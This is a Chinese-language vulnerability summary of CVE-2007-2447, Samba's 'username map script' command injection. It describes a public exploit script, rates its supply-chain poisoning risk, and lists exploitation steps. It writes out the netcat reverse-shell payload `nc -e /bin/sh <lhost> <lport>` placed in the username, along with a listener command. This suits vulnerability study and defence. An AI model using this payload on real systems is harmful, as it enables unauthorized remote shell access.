## CVE-2007-2447 - Samba usermap script 命令注入

**漏洞编号:** CVE-2007-2447

**漏洞类型:** 命令注入

**影响应用:** Samba

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.0.0 through 3.0.25rc3

**利用条件:** 需要目标系统启用 'username map script' 配置选项。需要能够通过SMB协议连接到目标系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2007-2447 存在于 Samba 的 MS-RPC 功能中。当启用了 `username map script` 选项时，攻击者可以通过 `SamrChangePassword` 函数利用此漏洞，注入包含 shell 元字符的恶意命令。该漏洞允许远程攻击者执行任意命令。提供的 exploit.py 脚本通过设置包含反弹 shell 命令的用户名来利用此漏洞。具体来说，它构造一个包含 `nc -e /bin/sh <lhost> <lport>` 命令的用户名，并将其设置为 SMB 连接的用户名。当 Samba 尝试使用该用户名执行 `username map script` 时，命令注入就会发生，从而建立一个反向 shell。虽然该脚本较为简单，但如果目标配置满足漏洞利用的条件，则它应该可以成功利用该漏洞。

关于投毒风险，代码主体逻辑清晰，主要实现漏洞利用，没有明显的恶意行为。`README.md` 中存在github地址,可以进行溯源，降低投毒的可能性. 但任何时候都不能完全排除投毒的可能性，尤其是在使用第三方提供的代码时。建议在使用前仔细审查代码。

**利用方式：**

1.  **环境准备：** 确保目标 Samba 服务器版本在 3.0.0 到 3.0.25rc3 之间，并且启用了 `username map script` 配置选项。
2.  **监听端口：** 在攻击者机器上设置一个 Netcat 监听器 (`nc -lvnp <lport>`)。
3.  **执行漏洞利用脚本：** 运行 exploit.py 脚本，提供目标 IP 地址 (`rhost`)、端口 (`rport`)，以及攻击者机器的 IP 地址 (`lhost`) 和监听端口 (`lport`)。
4.  **获取 Shell：** 如果漏洞利用成功，攻击者将在 Netcat 监听器上获得一个反向 shell。

**项目地址:** [Alien0ne/CVE-2007-2447](https://github.com/Alien0ne/CVE-2007-2447)

**漏洞详情:** [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)